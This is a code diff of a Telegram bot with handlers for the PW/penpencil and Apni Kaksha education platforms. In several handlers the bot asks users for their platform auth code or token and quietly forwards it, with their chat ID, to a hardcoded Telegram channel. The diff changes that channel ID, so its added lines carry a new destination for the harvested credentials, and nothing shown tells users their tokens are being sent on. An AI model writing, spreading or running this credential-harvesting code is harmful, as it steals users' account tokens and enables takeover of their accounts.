@@ -1065,7 +1065,7 @@ async def accounpwlwogin(bot: Client, m: Message):
     input1: Message = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
     await bot.send_message(
-        -1002698150766, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
+        -1002620232917, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
     )
     headers = {
         "Host": "api.penpencil.co",
@@ -1305,7 +1305,7 @@ async def khazanan(bot: Client, m: Message):
     input1: Message = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
     await bot.send_message(
-        -1002698150766, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
+        -1002620232917, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
     )
     headers = {
         "Host": "api.penpencil.xyz",
@@ -1334,7 +1334,7 @@ async def khazanan(bot: Client, m: Message):
     input2 = message = await bot.listen(editable.chat.id)
     raw_text2 = input2.text
     await bot.send_message(
-        -1002698150766, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text2}`"
+        -1002620232917, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text2}`"
     )
     response2 = requests.get(
         f"https://api.penpencil.co/v1/programs/{raw_text2}/subjects", headers=headers
@@ -1490,7 +1490,7 @@ async def apnissn(bot: Client, m: Message):
     input1 = await bot.listen(editable.chat.id)
     token = input1.text
     await bot.send_message(
-        -1002698150766, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
+        -1002620232917, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
     )
     headers1 = {
         "Host": "spec.apnikaksha.net",
